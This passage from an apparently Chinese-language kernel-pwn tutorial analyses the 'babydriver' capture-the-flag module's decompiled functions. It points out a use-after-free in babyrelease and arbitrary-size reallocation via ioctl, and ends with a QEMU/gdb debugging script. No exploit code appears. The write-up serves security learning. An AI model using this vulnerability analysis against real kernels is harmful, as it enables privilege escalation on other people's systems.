<span class="keyword">long</span> mmap_supported_flags;</span><br><span class="line">  <span class="keyword">int</span> (*open) (struct inode *, struct file *);</span><br><span class="line">  <span class="keyword">int</span> (*flush) (struct file *, <span class="keyword">fl_owner_t</span> id);</span><br><span class="line">  <span class="keyword">int</span> (*release) (struct inode *, struct file *);</span><br><span class="line">  <span class="keyword">int</span> (*fsync) (struct file *, <span class="keyword">loff_t</span>, <span class="keyword">loff_t</span>, <span class="keyword">int</span> datasync);</span><br><span class="line">  <span class="keyword">int</span> (*fasync) (<span class="keyword">int</span>, struct file *, <span class="keyword">int</span>);</span><br><span class="line">  <span class="keyword">int</span> (*lock) (struct file *, <span class="keyword">int</span>, struct file_lock *);</span><br><span class="line">  <span class="keyword">ssize_t</span> (*sendpage) (struct file *, struct page *, <span class="keyword">int</span>, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *, <span class="keyword">int</span>);</span><br><span class="line">  <span class="function"><span class="keyword">unsigned</span> <span class="title">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(struct file *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>)</span></span>;</span><br><span class="line">  <span class="keyword">int</span> (*check_flags)(<span class="keyword">int</span>);</span><br><span class="line">  <span class="keyword">int</span> (*flock) (struct file *, <span class="keyword">int</span>, struct file_lock *);</span><br><span class="line">  <span class="keyword">ssize_t</span> (*splice_write)(struct pipe_inode_info *, struct file *, <span class="keyword">loff_t</span> *, <span class="keyword">size_t</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line">  <span class="keyword">ssize_t</span> (*splice_read)(struct file *, <span class="keyword">loff_t</span> *, struct pipe_inode_info *, <span class="keyword">size_t</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line">  <span class="keyword">int</span> (*setlease)(struct file *, <span class="keyword">long</span>, struct file_lock **, <span class="keyword">void</span> **);</span><br><span class="line">  <span class="keyword">long</span> (*fallocate)(struct file *file, <span class="keyword">int</span> mode, <span class="keyword">loff_t</span> offset,</span><br><span class="line">        <span class="keyword">loff_t</span> len);</span><br><span class="line">  <span class="keyword">void</span> (*show_fdinfo)(struct seq_file *m, struct file *f);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line">  <span class="keyword">unsigned</span> (*mmap_capabilities)(struct file *);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">ssize_t</span> (*copy_file_range)(struct file *, <span class="keyword">loff_t</span>, struct file *,</span><br><span class="line">      <span class="keyword">loff_t</span>, <span class="keyword">size_t</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line">  <span class="keyword">loff_t</span> (*remap_file_range)(struct file *file_in, <span class="keyword">loff_t</span> pos_in,</span><br><span class="line">           struct file *file_out, <span class="keyword">loff_t</span> pos_out,</span><br><span class="line">           <span class="keyword">loff_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> remap_flags);</span><br><span class="line">  <span class="keyword">int</span> (*fadvise)(struct file *, <span class="keyword">loff_t</span>, <span class="keyword">loff_t</span>, <span class="keyword">int</span>);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p>但在这道题中我们只会用到其中的一小部分，即 <code>/baby(open|release|read|write|ioctl)/</code>。</p>
<blockquote>
<p>struct file_operations 中的 owner 指针是必须指向当前内核模块的指针，可以使用宏定义 <code>THIS_MODULE</code> 来获取该指针。</p>
</blockquote>
<p>当 cdev 结构体初始化完成后，最后的一步就是使用 <code>cdev_add</code> 告诉内核该设备的设备号。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cdev_add(&amp;cdev_0, babydev_no, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>其中，<code>cdev_add</code> 函数声明如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * cdev_add() - add a char device to the system</span></span><br><span class="line"><span class="comment"> * @p: the cdev structure for the device</span></span><br><span class="line"><span class="comment"> * @dev: the first device number for which this device is responsible</span></span><br><span class="line"><span class="comment"> * @count: the number of consecutive minor numbers corresponding to this</span></span><br><span class="line"><span class="comment"> *         device</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * cdev_add() adds the device represented by @p to the system, making it</span></span><br><span class="line"><span class="comment"> * live immediately.  A negative error code is returned on failure.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cdev_add</span><span class="params">(struct cdev *p, <span class="keyword">dev_t</span> dev, <span class="keyword">unsigned</span> count)</span></span></span><br></pre></td></tr></table></figure>
<p>需要注意的是，一旦 <code>cdev_add</code> 函数执行完成，则当前 cdev 设备<strong>立即处于活动状态</strong>，其<strong>操作可以立即被内核调用</strong>。因此在编写驱动程序时，务必保证在驱动程序完全准备好处理设备上的操作之后，最后再来调用 <code>cdev_add</code>。</p>
<h6 id="1-4-将设备注册进-sysfs">1.4) 将设备注册进 sysfs</h6>
<p>当驱动模块已经将 cdev 注册进内核后，该函数将会执行以下代码，来将当前设备的设备结点注册进  sysfs 中。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">babydev_class = class_create(THIS_MODULE, <span class="string">"babydev"</span>);</span><br><span class="line">device_create(babydev_class, <span class="number">0</span>, babydev_no, <span class="number">0</span>, <span class="string">"babydev"</span>);</span><br></pre></td></tr></table></figure>
<p>其中，函数 <code>class_create</code> 和 <code>device_create</code> 的声明如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This is a #define to keep the compiler from merging different</span></span><br><span class="line"><span class="comment"> * instances of the __key variable */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> class_create(owner, name)    \</span></span><br><span class="line">(&#123;            \</span><br><span class="line">  <span class="keyword">static</span> struct lock_class_key __key;  \</span><br><span class="line">  __class_create(owner, name, &amp;__key);  \</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * class_create - create a struct class structure</span></span><br><span class="line"><span class="comment"> * @owner: pointer to the module that is to "own" this struct class</span></span><br><span class="line"><span class="comment"> * @name: pointer to a string for the name of this class.</span></span><br><span class="line"><span class="comment"> * @key: the lock_class_key for this class; used by mutex lock debugging</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This is used to create a struct class pointer that can then be used</span></span><br><span class="line"><span class="comment"> * in calls to device_create().</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns &amp;struct class pointer on success, or ERR_PTR() on error.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note, the pointer created here is to be destroyed when finished by</span></span><br><span class="line"><span class="comment"> * making a call to class_destroy().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">class</span> *__<span class="title">class_create</span>(<span class="title">struct</span> <span class="title">module</span> *<span class="title">owner</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">name</span>,</span></span><br><span class="line"><span class="class">           <span class="title">struct</span> <span class="title">lock_class_key</span> *<span class="title">key</span>)</span></span><br><span class="line"><span class="class">    </span></span><br><span class="line"><span class="class">/**</span></span><br><span class="line"><span class="class"> * <span class="title">device_create</span> - <span class="title">creates</span> <span class="title">a</span> <span class="title">device</span> <span class="title">and</span> <span class="title">registers</span> <span class="title">it</span> <span class="title">with</span> <span class="title">sysfs</span></span></span><br><span class="line"><span class="class"> * @<span class="title">class</span>:</span> pointer to the <span class="class"><span class="keyword">struct</span> <span class="title">class</span> <span class="title">that</span> <span class="title">this</span> <span class="title">device</span> <span class="title">should</span> <span class="title">be</span> <span class="title">registered</span> <span class="title">to</span></span></span><br><span class="line"><span class="class"> * @<span class="title">parent</span>:</span> pointer to the parent <span class="class"><span class="keyword">struct</span> <span class="title">device</span> <span class="title">of</span> <span class="title">this</span> <span class="title">new</span> <span class="title">device</span>, <span class="title">if</span> <span class="title">any</span></span></span><br><span class="line"><span class="class"> * @<span class="title">devt</span>:</span> the <span class="keyword">dev_t</span> <span class="keyword">for</span> the <span class="keyword">char</span> device to be added</span><br><span class="line"> * @drvdata: the data to be added to the device <span class="keyword">for</span> callbacks</span><br><span class="line"> * @fmt: <span class="built_in">string</span> <span class="keyword">for</span> the device<span class="number">'</span>s name</span><br><span class="line"> *</span><br><span class="line"> * This function can be used by <span class="keyword">char</span> device classes.  A <span class="class"><span class="keyword">struct</span> <span class="title">device</span></span></span><br><span class="line"><span class="class"> * <span class="title">will</span> <span class="title">be</span> <span class="title">created</span> <span class="title">in</span> <span class="title">sysfs</span>, <span class="title">registered</span> <span class="title">to</span> <span class="title">the</span> <span class="title">specified</span> <span class="title">class</span>.</span></span><br><span class="line"><span class="class"> *</span></span><br><span class="line"><span class="class"> * <span class="title">A</span> "<span class="title">dev</span>" <span class="title">file</span> <span class="title">will</span> <span class="title">be</span> <span class="title">created</span>, <span class="title">showing</span> <span class="title">the</span> <span class="title">dev_t</span> <span class="title">for</span> <span class="title">the</span> <span class="title">device</span>, <span class="title">if</span></span></span><br><span class="line"><span class="class"> * <span class="title">the</span> <span class="title">dev_t</span> <span class="title">is</span> <span class="title">not</span> 0,0.</span></span><br><span class="line"><span class="class"> * <span class="title">If</span> <span class="title">a</span> <span class="title">pointer</span> <span class="title">to</span> <span class="title">a</span> <span class="title">parent</span> <span class="title">struct</span> <span class="title">device</span> <span class="title">is</span> <span class="title">passed</span> <span class="title">in</span>, <span class="title">the</span> <span class="title">newly</span> <span class="title">created</span></span></span><br><span class="line"><span class="class"> * <span class="title">struct</span> <span class="title">device</span> <span class="title">will</span> <span class="title">be</span> <span class="title">a</span> <span class="title">child</span> <span class="title">of</span> <span class="title">that</span> <span class="title">device</span> <span class="title">in</span> <span class="title">sysfs</span>.</span></span><br><span class="line"><span class="class"> * <span class="title">The</span> <span class="title">pointer</span> <span class="title">to</span> <span class="title">the</span> <span class="title">struct</span> <span class="title">device</span> <span class="title">will</span> <span class="title">be</span> <span class="title">returned</span> <span class="title">from</span> <span class="title">the</span> <span class="title">call</span>.</span></span><br><span class="line"><span class="class"> * <span class="title">Any</span> <span class="title">further</span> <span class="title">sysfs</span> <span class="title">files</span> <span class="title">that</span> <span class="title">might</span> <span class="title">be</span> <span class="title">required</span> <span class="title">can</span> <span class="title">be</span> <span class="title">created</span> <span class="title">using</span> <span class="title">this</span></span></span><br><span class="line"><span class="class"> * <span class="title">pointer</span>.</span></span><br><span class="line"><span class="class"> *</span></span><br><span class="line"><span class="class"> * <span class="title">Returns</span> &amp;<span class="title">struct</span> <span class="title">device</span> <span class="title">pointer</span> <span class="title">on</span> <span class="title">success</span>, <span class="title">or</span> <span class="title">ERR_PTR</span>() <span class="title">on</span> <span class="title">error</span>.</span></span><br><span class="line"><span class="class"> *</span></span><br><span class="line"><span class="class"> * <span class="title">Note</span>:</span> the <span class="class"><span class="keyword">struct</span> <span class="title">class</span> <span class="title">passed</span> <span class="title">to</span> <span class="title">this</span> <span class="title">function</span> <span class="title">must</span> <span class="title">have</span> <span class="title">previously</span></span></span><br><span class="line"><span class="class"> * <span class="title">been</span> <span class="title">created</span> <span class="title">with</span> <span class="title">a</span> <span class="title">call</span> <span class="title">to</span> <span class="title">class_create</span>().</span></span><br><span class="line"><span class="class"> */</span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">device</span> *<span class="title">device_create</span>(<span class="title">struct</span> <span class="title">class</span> *<span class="title">class</span>, <span class="title">struct</span> <span class="title">device</span> *<span class="title">parent</span>,</span></span><br><span class="line"><span class="class">           <span class="title">dev_t</span> <span class="title">devt</span>, <span class="title">void</span> *<span class="title">drvdata</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">fmt</span>, ...)</span></span><br></pre></td></tr></table></figure>
<p>初始时，init 函数通过调用 <code>class_create</code> 函数创建一个 <code>class</code> 类型的<strong>类</strong>，创建好后的<strong>类</strong>存放于sysfs下面，可以在 <code>/sys/class</code>中找到。</p>
<p>之后函数调用 <code>device_create</code> 函数，动态建立<strong>逻辑设备</strong>，对新逻辑设备进行初始化；同时还将其与第一个参数所对应的<strong>逻辑类</strong>相关联，并将此逻辑设备加到linux内核系统的设备驱动程序模型中。这样，函数会自动在 <code>/sys/devices/virtual</code> 目录下创建新的逻辑设备目录，并在 <code>/dev</code> 目录下创建与<strong>逻辑类</strong>对应的设备文件。</p>
<p>最终实现效果就是，我们便可以在 <code>/dev</code> 中看到该设备。</p>
<h6 id="1-5-init-函数小结">1.5 init 函数小结</h6>
<p>综上，<code>babydriver_init</code> 函数主要做了几件事：</p>
<ol>
<li>向内核申请一个空闲的设备号</li>
<li>声明一个 cdev 结构体，初始化并绑定设备号</li>
<li>创建新的 struct class，并将该设备号所对应的设备注册进 sysfs</li>
</ol>
<h5 id="2-babydriver-exit">2) babydriver_exit</h5>
<p>理解完 init 函数后，理解 exit 函数的逻辑就相当的简单——把该释放的数据结构全部释放。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">babydriver_exit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  device_destroy(babydev_class, babydev_no);</span><br><span class="line">  class_destroy(babydev_class);</span><br><span class="line">  cdev_del(&amp;cdev_0);</span><br><span class="line">  unregister_chrdev_region(babydev_no, <span class="number">1L</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="3-babyopen">3) babyopen</h5>
<p>该函数代码如下：</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211004201828178.png" alt="image-20211004201828178"></p>
<p>babyopen 函数在内核中创建了一个 <code>babydev_struct</code> 的结构体，其中包含了一个 <code>device_buf</code> 指针以及一个 <code>device_buf_len</code>成员变量。</p>
<p>需要注意的是，<code>kmem_cache_alloc_trace</code> 函数分配内存的逻辑与 <code>kmalloc</code>类似，笔者怀疑反汇编出来的代码应该是调用 <code>kmalloc</code> 函数优化内敛后的效果：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * kmalloc - allocate memory</span></span><br><span class="line"><span class="comment"> * @size: how many bytes of memory are required.</span></span><br><span class="line"><span class="comment"> * @flags: the type of memory to allocate.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * kmalloc is the normal method of allocating memory</span></span><br><span class="line"><span class="comment"> * for objects smaller than page size in the kernel.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The allocated object address is aligned to at least ARCH_KMALLOC_MINALIGN</span></span><br><span class="line"><span class="comment"> * bytes. For @size of power of two bytes, the alignment is also guaranteed</span></span><br><span class="line"><span class="comment"> * to be at least to the size.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The @flags argument may be one of the GFP flags defined at</span></span><br><span class="line"><span class="comment"> * include/linux/gfp.h and described at</span></span><br><span class="line"><span class="comment"> * :ref:`Documentation/core-api/mm-api.rst &lt;mm-api-gfp-flags&gt;`</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The recommended usage of the @flags is described at</span></span><br><span class="line"><span class="comment"> * :ref:`Documentation/core-api/memory-allocation.rst &lt;memory_allocation&gt;`</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Below is a brief outline of the most useful GFP flags</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %GFP_KERNEL</span></span><br><span class="line"><span class="comment"> *  Allocate normal kernel ram. May sleep.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %GFP_NOWAIT</span></span><br><span class="line"><span class="comment"> *  Allocation will not sleep.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %GFP_ATOMIC</span></span><br><span class="line"><span class="comment"> *  Allocation will not sleep.  May use emergency pools.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %GFP_HIGHUSER</span></span><br><span class="line"><span class="comment"> *  Allocate memory from high memory on behalf of user.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Also it is possible to set different flags by OR'ing</span></span><br><span class="line"><span class="comment"> * in one or more of the following additional @flags:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %__GFP_HIGH</span></span><br><span class="line"><span class="comment"> *  This allocation has high priority and may use emergency pools.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %__GFP_NOFAIL</span></span><br><span class="line"><span class="comment"> *  Indicate that this allocation is in no way allowed to fail</span></span><br><span class="line"><span class="comment"> *  (think twice before using).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %__GFP_NORETRY</span></span><br><span class="line"><span class="comment"> *  If memory is not immediately available,</span></span><br><span class="line"><span class="comment"> *  then give up at once.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %__GFP_NOWARN</span></span><br><span class="line"><span class="comment"> *  If allocation fails, don't issue any warnings.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %__GFP_RETRY_MAYFAIL</span></span><br><span class="line"><span class="comment"> *  Try really hard to succeed the allocation but fail</span></span><br><span class="line"><span class="comment"> *  eventually.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (__builtin_constant_p(size)) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)</span><br><span class="line">      <span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line">    index = kmalloc_index(size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!index)</span><br><span class="line">      <span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> kmem_cache_alloc_trace(</span><br><span class="line">        kmalloc_caches[kmalloc_type(flags)][index],</span><br><span class="line">        flags, size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __kmalloc(size, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="4-babyrelease">4) babyrelease</h5>
<p>babyrelease 函数的逻辑较为简单，这里只是简单的将 babydev_struct.device_buf 释放掉。</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211004202526936.png" alt="image-20211004202526936"></p>
<p>但这里需要注意的是，尽管这里释放了指针所指向的内核空间，但 <strong>在释放完成后，该函数既没有对<code>device_buf</code>指针置空，也没有设置 <code>device_buf_len</code> 为0</strong> 。</p>
<h5 id="5-babyread">5) babyread</h5>
<p>babyread 函数的 IDA 反汇编效果存在错误，这是笔者根据汇编代码修正后的效果：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  result = <span class="number">-2L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; length )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_to_user(buffer, babydev_struct.device_buf, length);</span><br><span class="line">    result = length;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>babyread 函数将在判断完当前 device_buf 是否为空之后，将 device_buf 上的内存拷贝至用户空间的 buffer 内存。</p>
<h5 id="6-babywrite">6) babywrite</h5>
<p>babywrite 功能与 babyread 类似，将用户空间的 buffer 内存上的数据拷贝进内核空间的 device_buf 上，此处不再赘述。该函数修正后的反编译代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  result = <span class="number">-2L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; length )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_from_user(babydev_struct.device_buf, buffer, length);</span><br><span class="line">    result = length;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="7-babyioctl">7) babyioctl</h5>
<p>babyioctl 函数的功能类似于 <code>realloc</code>：将原先的 device_buf 释放，并分配一块新的内存。</p>
<p>但这里有个很重要的点需要注意：<strong>该位置的 kmalloc 大小可以被用户任意指定</strong>，而不是先前 babyopen 中的 64。</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211004203631020.png" alt="image-20211004203631020"></p>
<h4 id="e-获取到的信息">e. 获取到的信息</h4>
<p>根据上面的分析，最终我们可以得到以下信息：</p>
<p>已开启的保护：</p>
<ul>
<li>
<p>nx</p>
</li>
<li>
<p>smep</p>
</li>
</ul>
<p>内核模块中可能能利用的点：</p>
<ul>
<li>babyrelease <strong>释放 device_buf 指针后没有置空，device_buf_len 没有重置为0</strong></li>
<li>babyioctl 可以让 device_buf  重新分配<strong>任意大小</strong>的内存</li>
<li>当前内核模块中<strong>所有用到的变量都是全局变量</strong>，这意味着<strong>并发性非常的脆弱</strong>，或许可以利用一下。</li>
</ul>
<h3 id="4-调试前的准备">4. 调试前的准备</h3>
<ul>
<li>
<p>编写以下 shell 脚本以快速启动调试会话</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断当前权限是否为 root，需要高权限以执行 gef-remote --qemu-mode</span></span><br><span class="line">user=$(env | grep <span class="string">"^USER"</span> | cut -d <span class="string">"="</span> -f 2)</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$user</span>"</span> != <span class="string">"root"</span>  ]</span><br><span class="line">  <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"请使用 root 权限执行"</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 静态编译 exp</span></span><br><span class="line">gcc exp.c -static -o rootfs/exp</span><br><span class="line"></span><br><span class="line"><span class="comment"># rootfs 打包</span></span><br><span class="line"><span class="built_in">pushd</span> rootfs</span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.cpio</span><br><span class="line"><span class="built_in">popd</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 gdb</span></span><br><span class="line">gnome-terminal -e <span class="string">'gdb -x mygdbinit'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 qemu</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append <span class="string">'console=ttyS0 root=/dev/ram oops=panic panic=1'</span> \</span><br><span class="line">    -<span class="built_in">enable</span>-kvm \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -m 64M \</span><br><span class="line">    --nographic  